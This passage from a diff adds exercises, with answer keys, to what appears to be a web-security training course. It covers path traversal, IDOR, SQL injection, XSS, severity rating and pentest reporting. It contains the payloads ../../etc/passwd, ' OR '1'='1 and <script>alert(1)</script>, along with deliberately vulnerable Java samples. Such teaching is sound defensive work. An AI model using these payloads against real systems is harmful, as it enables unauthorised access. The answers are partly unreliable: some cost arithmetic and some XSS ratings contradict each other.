+          "starter_code": "import java.io.File;\n\npublic class FixPathTraversal {\n    static String safeReadFile(String baseDir, String filename) {\n        // TODO: Canonicalize path and verify it stays in baseDir\n        return \"\";\n    }\n    public static void main(String[] args) {\n        System.out.println(safeReadFile(\"/uploads\", \"doc.pdf\"));\n        System.out.println(safeReadFile(\"/uploads\", \"../../etc/passwd\"));\n    }\n}",
+          "expected_output": "ALLOWED: /uploads/doc.pdf\nBLOCKED: Path traversal detected",
+          "hints": [
+            {
+              "message": "Use getCanonicalFile() to resolve the full path, then check startsWith()."
+            },
+            {
+              "message": "File base = new File(baseDir); File f = new File(base, filename).getCanonicalFile(); if(!f.getPath().startsWith(base.getCanonicalPath())) block;"
+            },
+            {
+              "message": "Canonicalize both base and requested path. If requested doesn't start with base -> block."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_37",
+          "title": "Exercise 37: Information Exposure Scan",
+          "description": "Identify all information leaks in a set of server responses.",
+          "difficulty": "intermediate",
+          "category": "CSRF, CMDi & Path Traversal",
+          "estimated_minutes": 5,
+          "ai_intro": "These attacks are sneaky but very powerful!",
+          "starter_code": "public class InfoScan {\n    public static void main(String[] args) {\n        String[] responses = {\n            \"Server: Apache/2.4.41 (Ubuntu)\",\n            \"Content-Type: text/html\",\n            \"X-Powered-By: Express\",\n            \"<!-- DB connection: mysql://admin:pass@db:3306 -->\"\n        };\n        // TODO: Identify which headers/content leak information\n        for (String r : responses) {\n            System.out.println(r + \" -> \" + \"___\"); // LEAK or SAFE\n        }\n    }\n}",
+          "expected_output": "Server: Apache/2.4.41 (Ubuntu) -> LEAK (server type and version)\nContent-Type: text/html -> SAFE (standard header)\nX-Powered-By: Express -> LEAK (framework disclosure)\n<!-- DB connection: mysql://admin:pass@db:3306 --> -> LEAK (credentials in HTML comment!)",
+          "hints": [
+            {
+              "message": "Any header or content revealing technology, version, or credentials is a leak."
+            },
+            {
+              "message": "Server version, framework name, and database credentials are all exposure."
+            },
+            {
+              "message": "3 leaks: server version, framework header, DB credentials in comment. 1 safe: content-type."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_38",
+          "title": "Exercise 38: Broken Access Control Test",
+          "description": "Verify that role-based restrictions are enforced server-side.",
+          "difficulty": "intermediate",
+          "category": "CSRF, CMDi & Path Traversal",
+          "estimated_minutes": 5,
+          "ai_intro": "These attacks are sneaky but very powerful!",
+          "starter_code": "import java.util.*;\n\npublic class AccessControlTest {\n    static Map<String,String> sessions = Map.of(\"admin-sess\",\"ADMIN\",\"user-sess\",\"USER\");\n    static Set<String> adminPages = Set.of(\"/admin\",\"/admin/users\",\"/reports\");\n    \n    static String accessPage(String session, String page) {\n        String role = sessions.getOrDefault(session, \"NONE\");\n        boolean isAdmin = adminPages.contains(page);\n        // VULNERABLE: No server check!\n        return page + \" -> \" + (isAdmin && !role.equals(\"ADMIN\") ? \"SHOULD BLOCK but doesn't!\" : \"OK\");\n    }\n    public static void main(String[] args) {\n        System.out.println(\"=== ACCESS CONTROL TEST ===\");\n        System.out.println(accessPage(\"user-sess\", \"/dashboard\"));\n        System.out.println(accessPage(\"user-sess\", \"/admin\"));\n        System.out.println(accessPage(\"user-sess\", \"/admin/users\"));\n        System.out.println(accessPage(\"user-sess\", \"/reports\"));\n    }\n}",
+          "expected_output": "/dashboard -> OK\n/admin -> SHOULD BLOCK but doesn't!\n/admin/users -> SHOULD BLOCK but doesn't!\n/reports -> SHOULD BLOCK but doesn't!",
+          "hints": [
+            {
+              "message": "Log in as a normal user and try to access every admin URL directly."
+            },
+            {
+              "message": "If you can access admin pages as a normal user, there's no server-side role check."
+            },
+            {
+              "message": "3 admin pages accessible to normal user = broken access control on all three."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_39",
+          "title": "Exercise 39: IDOR Exploitation",
+          "description": "Test for Insecure Direct Object References.",
+          "difficulty": "intermediate",
+          "category": "CSRF, CMDi & Path Traversal",
+          "estimated_minutes": 5,
+          "ai_intro": "These attacks are sneaky but very powerful!",
+          "starter_code": "import java.util.*;\n\npublic class IDORTest {\n    static Map<String, String> userData = Map.of(\"1\",\"Alice's card: 4111-1111-1111-1111\",\n        \"2\",\"Bob's card: 5500-0000-0000-0004\", \"3\",\"Admin's data: CLASSIFIED\");\n    \n    // VULNERABLE: no ownership check\n    static String getProfile(String userId) {\n        return userData.getOrDefault(userId, \"Not found\");\n    }\n    public static void main(String[] args) {\n        System.out.println(\"=== IDOR TEST (logged in as user 1) ===\");\n        System.out.println(\"/profile?id=1: \" + getProfile(\"1\")); // Own data\n        System.out.println(\"/profile?id=2: \" + getProfile(\"2\")); // Other user!\n        System.out.println(\"/profile?id=3: \" + getProfile(\"3\")); // Admin data!\n        System.out.println(\"\\nIDOR confirmed: user 1 can access user 2 and 3's data\");\n    }\n}",
+          "expected_output": "/profile?id=1: Alice's card: 4111-1111-1111-1111\n/profile?id=2: Bob's card: 5500-0000-0000-0004\n/profile?id=3: Admin's data: CLASSIFIED\n\nIDOR confirmed: user 1 can access user 2 and 3's data",
+          "hints": [
+            {
+              "message": "Change the id parameter to another user's ID and check if their data is returned."
+            },
+            {
+              "message": "If you can see other users' card numbers by changing ?id=, there's no ownership check."
+            },
+            {
+              "message": "IDOR confirmed on all IDs. Fix: verify session user matches requested profile owner."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_40",
+          "title": "Exercise 40: Multi-Vulnerability Assessment",
+          "description": "Test a single endpoint for multiple vulnerability types.",
+          "difficulty": "intermediate",
+          "category": "CSRF, CMDi & Path Traversal",
+          "estimated_minutes": 5,
+          "ai_intro": "These attacks are sneaky but very powerful!",
+          "starter_code": "public class MultiVulnTest {\n    // Endpoint: /search?q=USER_INPUT (reflected in page, used in SQL query)\n    public static void main(String[] args) {\n        System.out.println(\"=== MULTI-VULNERABILITY TEST: /search ===\");\n        System.out.println(\"\\nTest 1 - SQLi: q=' OR '1'='1 -> ___\");\n        System.out.println(\"Test 2 - XSS: q=<script>alert(1)</script> -> ___\");\n        System.out.println(\"Test 3 - Info: q='' (empty) -> check error message -> ___\");\n        System.out.println(\"\\nFindings summary: ___ vulnerabilities found in one endpoint\");\n    }\n}",
+          "expected_output": "Test 1 - SQLi: q=' OR '1'='1 -> Returns all records (SQL injection confirmed)\nTest 2 - XSS: q=<script>alert(1)</script> -> Alert box appears (XSS confirmed)\nTest 3 - Info: q='' (empty) -> SQL error with table name exposed (info leak confirmed)\n\nFindings summary: 3 vulnerabilities found in one endpoint",
+          "hints": [
+            {
+              "message": "One input can have MULTIPLE vulnerability types. Always test for all of them."
+            },
+            {
+              "message": "The search input goes into a SQL query (SQLi) and is reflected in the page (XSS) and errors expose info."
+            },
+            {
+              "message": "3 vulns in one endpoint: SQLi, reflected XSS, and information exposure. Report all three separately."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_41",
+          "title": "Exercise 41: CIA Rating Practice",
+          "description": "Rate CIA impact for 5 different vulnerabilities.",
+          "difficulty": "intermediate",
+          "category": "CIA Impact & Severity",
+          "estimated_minutes": 5,
+          "ai_intro": "Impact analysis is what makes your reports professional!",
+          "starter_code": "// Rate C, I, A as HIGH/MEDIUM/LOW:\n// 1. SQL Injection (full DB access): C=___ I=___ A=___\n// 2. Reflected XSS: C=___ I=___ A=___\n// 3. CSRF on password change: C=___ I=___ A=___\n// 4. Directory listing: C=___ I=___ A=___\n// 5. Command injection: C=___ I=___ A=___",
+          "expected_output": "1. C=HIGH I=HIGH A=HIGH\n2. C=LOW I=LOW A=LOW\n3. C=LOW I=HIGH A=MEDIUM\n4. C=MEDIUM I=LOW A=LOW\n5. C=HIGH I=HIGH A=HIGH",
+          "hints": [
+            {
+              "message": "C=read data, I=modify data, A=disrupt service."
+            },
+            {
+              "message": "SQLi and CMDi impact everything. XSS reflected is limited. CSRF modifies but doesn't read."
+            },
+            {
+              "message": "1.H/H/H 2.L/L/L 3.L/H/M 4.M/L/L 5.H/H/H"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_42",
+          "title": "Exercise 42: Severity Classification",
+          "description": "Assign CRITICAL/HIGH/MEDIUM/LOW to each finding.",
+          "difficulty": "intermediate",
+          "category": "CIA Impact & Severity",
+          "estimated_minutes": 5,
+          "ai_intro": "Impact analysis is what makes your reports professional!",
+          "starter_code": "// Assign severity:\n// 1. SQL Injection allowing full database dump: ___\n// 2. Missing Secure flag on session cookie: ___\n// 3. Stored XSS in admin-visible page: ___\n// 4. Server version in HTTP header: ___\n// 5. CSRF on account deletion: ___\n// 6. Information disclosure in error messages: ___",
+          "expected_output": "1. CRITICAL\n2. LOW\n3. HIGH\n4. LOW\n5. HIGH\n6. MEDIUM",
+          "hints": [
+            {
+              "message": "CRITICAL = full system compromise. HIGH = significant impact. MEDIUM = limited impact. LOW = informational."
+            },
+            {
+              "message": "DB dump=critical. Missing flag=low. Stored XSS=high. Version=low. Account deletion CSRF=high. Error info=medium."
+            },
+            {
+              "message": "1.CRITICAL 2.LOW 3.HIGH 4.LOW 5.HIGH 6.MEDIUM"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_43",
+          "title": "Exercise 43: Prioritise Remediation",
+          "description": "Order vulnerability fixes by priority.",
+          "difficulty": "intermediate",
+          "category": "CIA Impact & Severity",
+          "estimated_minutes": 5,
+          "ai_intro": "Impact analysis is what makes your reports professional!",
+          "starter_code": "// Given these findings, order by fix priority (1=first):\n// A. SQL Injection in login (CRITICAL)\n// B. Missing SameSite cookie (LOW)\n// C. Stored XSS in profile (HIGH)\n// D. Command injection in admin tool (CRITICAL)\n// E. Verbose error messages (MEDIUM)\n// F. CSRF on transfer (HIGH)\n//\n// Priority order: ___",
+          "expected_output": "Priority: A, D, C, F, E, B\n1. A (SQL Injection) - CRITICAL, public-facing\n2. D (Command Injection) - CRITICAL, server access\n3. C (Stored XSS) - HIGH, affects all users\n4. F (CSRF transfer) - HIGH, financial impact\n5. E (Error messages) - MEDIUM, helps attackers plan\n6. B (Cookie flag) - LOW, informational",
+          "hints": [
+            {
+              "message": "Fix CRITICAL first, then HIGH, MEDIUM, LOW."
+            },
+            {
+              "message": "Both CRITICALs first. Then HIGHs sorted by impact. Then MEDIUM and LOW."
+            },
+            {
+              "message": "A,D (critical) > C,F (high) > E (medium) > B (low). Within same level, prioritise by impact."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_44",
+          "title": "Exercise 44: Real-World Breach Mapping",
+          "description": "Map famous breaches to vulnerability types.",
+          "difficulty": "intermediate",
+          "category": "CIA Impact & Severity",
+          "estimated_minutes": 5,
+          "ai_intro": "Impact analysis is what makes your reports professional!",
+          "starter_code": "// Match each breach to its primary vulnerability:\n// A. Equifax 2017 (147M records)\n// B. British Airways 2018 (380K cards)\n// C. Sony Pictures 2014 (company emails)\n// D. Heartland Payment 2008 (130M cards)\n//\n// Vulnerabilities: SQL Injection, XSS/Magecart, Spear Phishing, Unpatched Software\n// 1. Equifax: ___\n// 2. British Airways: ___\n// 3. Sony Pictures: ___\n// 4. Heartland: ___",
+          "expected_output": "1. Equifax: Unpatched Software (Apache Struts CVE)\n2. British Airways: XSS/Magecart (skimming script injected)\n3. Sony Pictures: Spear Phishing (social engineering)\n4. Heartland: SQL Injection (payment data stolen)",
+          "hints": [
+            {
+              "message": "Each breach had a different root cause vulnerability."
+            },
+            {
+              "message": "Equifax=unpatched CVE. BA=JavaScript card skimmer. Sony=phishing. Heartland=SQLi."
+            },
+            {
+              "message": "1.Unpatched 2.XSS/Magecart 3.Phishing 4.SQLi"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_45",
+          "title": "Exercise 45: CVSS-Style Scoring",
+          "description": "Calculate a simplified severity score.",
+          "difficulty": "intermediate",
+          "category": "CIA Impact & Severity",
+          "estimated_minutes": 5,
+          "ai_intro": "Impact analysis is what makes your reports professional!",
+          "starter_code": "public class CVSSLite {\n    static double score(double exploitability, double impact) {\n        // Simplified: (exploitability * 0.4) + (impact * 0.6)\n        return Math.round((exploitability * 0.4 + impact * 0.6) * 10.0) / 10.0;\n    }\n    public static void main(String[] args) {\n        // Exploitability: 1.0=easy, 0.5=moderate, 0.1=hard\n        // Impact: 1.0=full, 0.5=partial, 0.1=minimal\n        // TODO: Calculate scores\n        System.out.println(\"SQLi (easy exploit, full impact): \" + score(1.0, 1.0));\n        System.out.println(\"Reflected XSS (moderate, partial): \" + score(0.5, 0.5));\n        System.out.println(\"Info disclosure (easy, minimal): \" + score(1.0, 0.1));\n    }\n}",
+          "expected_output": "SQLi (easy exploit, full impact): 1.0\nReflected XSS (moderate, partial): 0.5\nInfo disclosure (easy, minimal): 0.5",
+          "hints": [
+            {
+              "message": "Score combines how easy it is to exploit with how much damage it causes."
+            },
+            {
+              "message": "Full exploitability + full impact = 1.0 (maximum). Easy exploit but low impact = lower score."
+            },
+            {
+              "message": "SQLi=1.0, XSS=0.5, Info=0.5. SQLi is clearly highest priority."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_46",
+          "title": "Exercise 46: Compare Vulnerability Severity",
+          "description": "Rank which of two findings is more severe.",
+          "difficulty": "advanced",
+          "category": "CIA Impact & Severity",
+          "estimated_minutes": 5,
+          "ai_intro": "Impact analysis is what makes your reports professional!",
+          "starter_code": "// For each pair, which is MORE SEVERE? (A or B)\n// 1. A: SQLi in public login    B: SQLi in admin-only tool\n//    More severe: ___  Why: ___\n// 2. A: Stored XSS in profile    B: Reflected XSS in search\n//    More severe: ___  Why: ___\n// 3. A: CSRF on password change  B: CSRF on theme preference\n//    More severe: ___  Why: ___",
+          "expected_output": "1. A: Public login SQLi (any attacker can reach it vs admin-only)\n2. A: Stored XSS (affects all users automatically vs needs victim click)\n3. A: Password change CSRF (account takeover vs cosmetic change)",
+          "hints": [
+            {
+              "message": "Consider: who can exploit it (public vs admin) and what's the impact?"
+            },
+            {
+              "message": "Public-facing > admin-only. Stored > reflected. Account takeover > cosmetic."
+            },
+            {
+              "message": "1.A(public access) 2.A(persistent, all users) 3.A(account takeover)"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_47",
+          "title": "Exercise 47: Write Executive Summary",
+          "description": "Create a high-level summary for non-technical stakeholders.",
+          "difficulty": "advanced",
+          "category": "CIA Impact & Severity",
+          "estimated_minutes": 5,
+          "ai_intro": "Impact analysis is what makes your reports professional!",
+          "starter_code": "// TODO: Write a 5-line executive summary for these findings:\n// 10 total findings: 2 CRITICAL, 4 HIGH, 3 MEDIUM, 1 LOW\n// Key: SQL injection allows full database access\n// Key: Stored XSS can steal user sessions\n// Target: Banking application\n\nSystem.out.println(\"Executive Summary:\");\nSystem.out.println(\"___\");",
+          "expected_output": "Executive Summary:\nA security assessment of the banking application identified 10 vulnerabilities,\nincluding 2 critical issues that could allow an attacker to access the entire\ndatabase and steal user sessions. The 2 critical and 4 high-severity findings\nrequire immediate remediation to prevent potential financial loss and data breach.\nWe recommend prioritising the SQL injection and XSS fixes within this sprint.",
+          "hints": [
+            {
+              "message": "Executive summaries are for managers — no technical jargon."
+            },
+            {
+              "message": "State: total findings, worst case scenario, business impact, recommended timeline."
+            },
+            {
+              "message": "Brief, non-technical. Total count, critical issues highlighted, business impact, action needed."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_48",
+          "title": "Exercise 48: Risk Acceptance Decision",
+          "description": "Determine which low-severity findings to accept vs fix.",
+          "difficulty": "advanced",
+          "category": "CIA Impact & Severity",
+          "estimated_minutes": 5,
+          "ai_intro": "Impact analysis is what makes your reports professional!",
+          "starter_code": "// Your team has limited time. Which LOW findings to fix vs accept risk?\n// A. Server version in headers (LOW) - Fix cost: 5 min\n// B. Autocomplete on login (LOW) - Fix cost: 2 min\n// C. Missing X-Frame-Options (LOW) - Fix cost: 5 min\n// D. Cookie without SameSite (LOW) - Fix cost: 5 min\n//\n// Budget: 10 minutes. What do you fix? What do you accept?\nSystem.out.println(\"Fix: ___\");\nSystem.out.println(\"Accept: ___\");\nSystem.out.println(\"Reasoning: ___\");",
+          "expected_output": "Fix: A (5min) + B (2min) + C (3min) = 10min (or A+B+D)\nAccept: D (or C)\nReasoning: All are quick fixes. Prioritise server version (helps attackers target CVEs)\nand X-Frame-Options (prevents clickjacking). SameSite can be accepted if other CSRF\nprotections exist.",
+          "hints": [
+            {
+              "message": "When all are LOW, fix the cheapest ones first."
+            },
+            {
+              "message": "Quick wins: all under 5 minutes. Fix as many as possible within budget."
+            },
+            {
+              "message": "Fix all that fit in 10 minutes. Accept the remainder with documented justification."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_49",
+          "title": "Exercise 49: Vulnerability Chaining",
+          "description": "Show how combining low-severity findings creates high-severity risk.",
+          "difficulty": "advanced",
+          "category": "CIA Impact & Severity",
+          "estimated_minutes": 5,
+          "ai_intro": "Impact analysis is what makes your reports professional!",
+          "starter_code": "// Individual findings:\n// 1. Information disclosure: server version Apache 2.4.41 (LOW)\n// 2. Error messages reveal database type MySQL 5.7 (MEDIUM)\n// 3. Directory listing shows backup files (MEDIUM)\n//\n// TODO: Explain how chaining these creates a HIGHER risk\nSystem.out.println(\"Chain: ___\");\nSystem.out.println(\"Combined severity: ___\");",
+          "expected_output": "Chain: Attacker uses directory listing to find backup SQL file,\nuses database type from errors to understand the schema,\nuses server version to find known CVEs for Apache 2.4.41.\nCombined: attacker has server version + database type + backup files\n= targeted exploitation with insider knowledge.\nCombined severity: HIGH (individual LOWs chain into HIGH risk)",
+          "hints": [
+            {
+              "message": "Low-severity information helps attackers plan higher-impact attacks."
+            },
+            {
+              "message": "Server version -> find CVEs. DB type -> craft SQLi. Backup files -> find credentials."
+            },
+            {
+              "message": "Info exposure chains: version+DB+backups = targeted attack plan. Individual LOW -> combined HIGH."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_50",
+          "title": "Exercise 50: Complete CIA Analysis Report",
+          "description": "Write full CIA analysis for 5 findings in a report.",
+          "difficulty": "advanced",
+          "category": "CIA Impact & Severity",
+          "estimated_minutes": 5,
+          "ai_intro": "Impact analysis is what makes your reports professional!",
+          "starter_code": "// TODO: Complete the CIA table for these 5 findings:\n// | # | Vulnerability | CWE | C | I | A | Severity |\n// |---|---|---|---|---|---|---|\n// | 1 | SQL Injection | CWE-89 | ___ | ___ | ___ | ___ |\n// | 2 | Stored XSS | CWE-79 | ___ | ___ | ___ | ___ |\n// | 3 | CSRF Transfer | CWE-352 | ___ | ___ | ___ | ___ |\n// | 4 | Path Traversal | CWE-22 | ___ | ___ | ___ | ___ |\n// | 5 | Version Disclosure | CWE-200 | ___ | ___ | ___ | ___ |",
+          "expected_output": "| 1 | SQL Injection | CWE-89 | HIGH | HIGH | HIGH | CRITICAL |\n| 2 | Stored XSS | CWE-79 | HIGH | MEDIUM | LOW | HIGH |\n| 3 | CSRF Transfer | CWE-352 | LOW | HIGH | LOW | HIGH |\n| 4 | Path Traversal | CWE-22 | HIGH | LOW | LOW | MEDIUM |\n| 5 | Version Disclosure | CWE-200 | LOW | LOW | LOW | LOW |",
+          "hints": [
+            {
+              "message": "Rate each dimension independently based on what the attacker can actually DO."
+            },
+            {
+              "message": "SQLi=all high. XSS=reads cookies(C), defaces(I). CSRF=modifies(I). Path=reads(C). Version=info only."
+            },
+            {
+              "message": "1.H/H/H/CRITICAL 2.H/M/L/HIGH 3.L/H/L/HIGH 4.H/L/L/MEDIUM 5.L/L/L/LOW"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_51",
+          "title": "Exercise 51: Map a Complete Application",
+          "description": "Create a full attack surface map for a banking app.",
+          "difficulty": "advanced",
+          "category": "Full Assessments & Reporting",
+          "estimated_minutes": 8,
+          "ai_intro": "You are putting it all together now — a complete professional assessment!",
+          "starter_code": "// Map ALL pages, inputs, and test types for:\n// Pages: /login, /register, /dashboard, /profile, /transfer, /admin, /search, /download\n// TODO: List at least 12 input points with their test types",
+          "expected_output": "12+ input points mapped:\n/login: username(SQLi,XSS), password(SQLi)\n/register: email(SQLi,XSS), password(strength)\n/dashboard: cookie(session)\n/profile: id param(IDOR,SQLi)\n/transfer: to_account(CSRF,SQLi), amount(CSRF,overflow)\n/admin: direct access(broken access control)\n/search: q param(XSS,SQLi)\n/download: file param(path traversal)",
+          "hints": [
+            {
+              "message": "Go page by page. For each page, list every input."
+            },
+            {
+              "message": "Include form fields, URL parameters, cookies, and hidden fields."
+            },
+            {
+              "message": "12+ inputs across 8 pages. Each input maps to at least one vulnerability test."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_52",
+          "title": "Exercise 52: Assess 5 Vulnerabilities",
+          "description": "Find and document 5 different vulnerability types in a simulated app.",
+          "difficulty": "advanced",
+          "category": "Full Assessments & Reporting",
+          "estimated_minutes": 8,
+          "ai_intro": "You are putting it all together now — a complete professional assessment!",
+          "starter_code": "// TODO: Write 5 vulnerability findings (one of each type):\n// 1. SQL Injection\n// 2. XSS\n// 3. CSRF\n// 4. Broken Access Control\n// 5. Information Exposure\n// For each: CWE, location, payload, CIA, severity",
+          "expected_output": "1. SQLi (CWE-89) /login username, ' OR '1'='1, CIA:H/H/H, CRITICAL\n2. XSS (CWE-79) /search q, <script>alert(1)</script>, CIA:H/M/L, HIGH\n3. CSRF (CWE-352) /transfer no token, auto-submit form, CIA:L/H/L, HIGH\n4. Broken AC (CWE-284) /admin no role check, direct browse, CIA:H/H/M, HIGH\n5. Info (CWE-200) /login error reveals DB type, SQL error message, CIA:M/L/L, MEDIUM",
+          "hints": [
+            {
+              "message": "One finding per category. Include all required fields."
+            },
+            {
+              "message": "For each: name, CWE, location (page+parameter), payload, CIA ratings, severity."
+            },
+            {
+              "message": "5 findings covering injection, XSS, CSRF, access control, and info exposure."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_53",
+          "title": "Exercise 53: Write Reproduction Steps",
+          "description": "Create clear, reproducible exploit instructions.",
+          "difficulty": "advanced",
+          "category": "Full Assessments & Reporting",
+          "estimated_minutes": 8,
+          "ai_intro": "You are putting it all together now — a complete professional assessment!",
+          "starter_code": "// TODO: Write step-by-step reproduction for SQL injection in /login\n// Each step must be specific and actionable\n// Someone who has never seen the app should be able to follow these",
+          "expected_output": "1. Open browser and navigate to http://target:8080/login\n2. In the 'Username' field, enter: admin' OR '1'='1' --\n3. In the 'Password' field, enter: anything\n4. Click the 'Login' button\n5. Observe: The dashboard page loads showing 'Welcome, admin'\n6. Verify: You are logged in as admin without valid credentials\n7. Impact: Full admin access achieved via authentication bypass",
+          "hints": [
+            {
+              "message": "Steps must be numbered, specific, and include exact inputs."
+            },
+            {
+              "message": "Include: URL, field name, exact payload, button to click, expected result."
+            },
+            {
+              "message": "7 clear steps: navigate, enter payload, enter password, click, observe, verify, impact."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_54",
+          "title": "Exercise 54: Generate Assessment Summary",
+          "description": "Create the executive summary section of a vulnerability report.",
+          "difficulty": "advanced",
+          "category": "Full Assessments & Reporting",
+          "estimated_minutes": 8,
+          "ai_intro": "You are putting it all together now — a complete professional assessment!",
+          "starter_code": "// Write an executive summary for:\n// App: Online Banking Platform\n// Findings: 2 CRITICAL, 3 HIGH, 4 MEDIUM, 1 LOW\n// Critical: SQL Injection (login), Command Injection (admin ping)\n// Key risk: Full database and server compromise possible",
+          "expected_output": "EXECUTIVE SUMMARY\n\nA security assessment of the Online Banking Platform identified 10 vulnerabilities.\n2 critical-severity issues allow complete database access and server command\nexecution. Combined with 3 high-severity findings (XSS, CSRF, broken access\ncontrol), the application is at significant risk of data breach and financial\nloss. Immediate remediation of critical findings is strongly recommended before\nthe next production deployment.",
+          "hints": [
+            {
+              "message": "Executive summary: no jargon, business impact, total findings, recommendation."
+            },
+            {
+              "message": "State total, critical count, business risk, and action needed."
+            },
+            {
+              "message": "Brief, clear, non-technical. Highlight worst-case scenario and urgency."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_55",
+          "title": "Exercise 55: Compare Before and After Fix",
+          "description": "Verify that applied mitigations are effective.",
+          "difficulty": "advanced",
+          "category": "Full Assessments & Reporting",
+          "estimated_minutes": 8,
+          "ai_intro": "You are putting it all together now — a complete professional assessment!",
+          "starter_code": "// TODO: For each vulnerability, show the test result before and after fix:\n// 1. SQLi: before=login bypass works, after=___\n// 2. XSS: before=alert appears, after=___\n// 3. CSRF: before=form works without token, after=___",
+          "expected_output": "1. SQLi: before=login bypass works, after=login fails (PreparedStatement blocks payload)\n2. XSS: before=alert appears, after=payload displayed as text (output encoded)\n3. CSRF: before=form works without token, after=403 Forbidden (token required and validated)",
+          "hints": [
+            {
+              "message": "Test with the SAME payload that worked before."
+            },
+            {
+              "message": "If the fix works, the same payload should now fail or be neutralised."
+            },
+            {
+              "message": "1.PreparedStatement blocks 2.Output encoding shows text 3.Token validation returns 403"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_56",
+          "title": "Exercise 56: Full Report Structure",
+          "description": "Outline a complete professional vulnerability assessment report.",
+          "difficulty": "advanced",
+          "category": "Full Assessments & Reporting",
+          "estimated_minutes": 8,
+          "ai_intro": "You are putting it all together now — a complete professional assessment!",
+          "starter_code": "// TODO: List the sections of a professional vulnerability report\n// in correct order with a brief description of each",
+          "expected_output": "1. Cover Page (title, date, assessor, target)\n2. Executive Summary (high-level findings for management)\n3. Scope & Methodology (what was tested, how)\n4. Risk Rating Definitions (CRITICAL/HIGH/MEDIUM/LOW criteria)\n5. Summary of Findings (table: #, name, CWE, severity)\n6. Detailed Findings (per vuln: description, steps, evidence, CIA, fix)\n7. Remediation Priority (ordered fix list with timeline)\n8. Appendix (tools used, raw data, additional evidence)",
+          "hints": [
+            {
+              "message": "Think about who reads each section: executives, developers, compliance."
+            },
+            {
+              "message": "Cover, summary, scope, definitions, summary table, detailed findings, remediation, appendix."
+            },
+            {
+              "message": "8 sections from cover page through appendix. Executives read 1-2, developers read 5-6."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_57",
+          "title": "Exercise 57: Methodology Documentation",
+          "description": "Document the testing methodology used.",
+          "difficulty": "advanced",
+          "category": "Full Assessments & Reporting",
+          "estimated_minutes": 8,
+          "ai_intro": "You are putting it all together now — a complete professional assessment!",
+          "starter_code": "// TODO: Write the Methodology section describing your approach\n// Include: tools, techniques, scope, limitations",
+          "expected_output": "METHODOLOGY:\nThe assessment used manual testing techniques supplemented by automated\nscanning. Testing covered OWASP Top 10 vulnerability categories including\ninjection, XSS, CSRF, broken access control, and security misconfiguration.\nAll testing was performed from an authenticated normal user perspective and\nan unauthenticated perspective. Scope included all web endpoints accessible\nvia browser. Limitations: no source code review, no infrastructure testing.",
+          "hints": [
+            {
+              "message": "Describe what you tested, how, from which perspective, and what you didn't test."
+            },
+            {
+              "message": "Include: scope (what pages), approach (manual/auto), perspective (user roles), limitations."
+            },
+            {
+              "message": "Methodology: manual testing, OWASP Top 10 categories, two perspectives, stated limitations."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_58",
+          "title": "Exercise 58: Remediation Recommendations",
+          "description": "Write specific fix recommendations for each vulnerability type.",
+          "difficulty": "advanced",
+          "category": "Full Assessments & Reporting",
+          "estimated_minutes": 8,
+          "ai_intro": "You are putting it all together now — a complete professional assessment!",
+          "starter_code": "// TODO: Write the specific remediation for each finding:\n// 1. SQL Injection fix: ___\n// 2. XSS fix: ___\n// 3. CSRF fix: ___\n// 4. Command Injection fix: ___\n// 5. Path Traversal fix: ___\n// 6. Broken Access Control fix: ___\n// 7. Information Exposure fix: ___",
+          "expected_output": "1. SQLi: Use PreparedStatement with parameterised queries for ALL database operations\n2. XSS: Apply context-appropriate output encoding (HTML, JS, URL) on ALL user-controlled output\n3. CSRF: Implement anti-CSRF tokens in all state-changing forms, validate server-side\n4. CMDi: Use input whitelisting, avoid Runtime.exec(), use ProcessBuilder with argument arrays\n5. Path: Canonicalize paths and verify they remain within allowed directory\n6. Access: Server-side role checks on EVERY endpoint, verify ownership for user-specific data\n7. Info: Custom error pages, disable directory listing, remove debug info and comments",
+          "hints": [
+            {
+              "message": "Each fix must be SPECIFIC — not just 'fix it' but exactly HOW."
+            },
+            {
+              "message": "PreparedStatement, output encoding, CSRF tokens, whitelist validation, canonical paths, role checks, custom errors."
+            },
+            {
+              "message": "7 specific fixes. Each names the exact technique and where to apply it."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_59",
+          "title": "Exercise 59: Complete Assessment Walkthrough",
+          "description": "Perform a mini-assessment from start to finish.",
+          "difficulty": "advanced",
+          "category": "Full Assessments & Reporting",
+          "estimated_minutes": 8,
+          "ai_intro": "You are putting it all together now — a complete professional assessment!",
+          "starter_code": "// TODO: Perform a complete assessment on this simulated endpoint:\n// /transfer POST with fields: to_account, amount\n// No CSRF token, input reflected in confirmation page, uses string concatenation for SQL\n//\n// Map inputs -> Test each -> Document findings -> Rate severity -> Recommend fixes",
+          "expected_output": "ATTACK SURFACE: 2 inputs (to_account, amount), POST form, no CSRF token\n\nFINDING 1: CSRF (CWE-352, HIGH) - No anti-CSRF token on transfer form\n  Payload: Auto-submitting external form\n  CIA: L/H/L\n  Fix: Add CSRF token\n\nFINDING 2: SQLi (CWE-89, CRITICAL) - to_account concatenated into SQL\n  Payload: ' OR '1'='1' --\n  CIA: H/H/H\n  Fix: PreparedStatement\n\nFINDING 3: Reflected XSS (CWE-79, MEDIUM) - Input reflected in confirmation\n  Payload: <script>alert(1)</script>\n  CIA: L/L/L\n  Fix: Output encoding\n\nPRIORITY: SQLi -> CSRF -> XSS",
+          "hints": [
+            {
+              "message": "Follow the methodology: map, test, document, rate, recommend."
+            },
+            {
+              "message": "2 inputs + no CSRF token = at least 3 potential findings. Test for SQLi, XSS, CSRF on each."
+            },
+            {
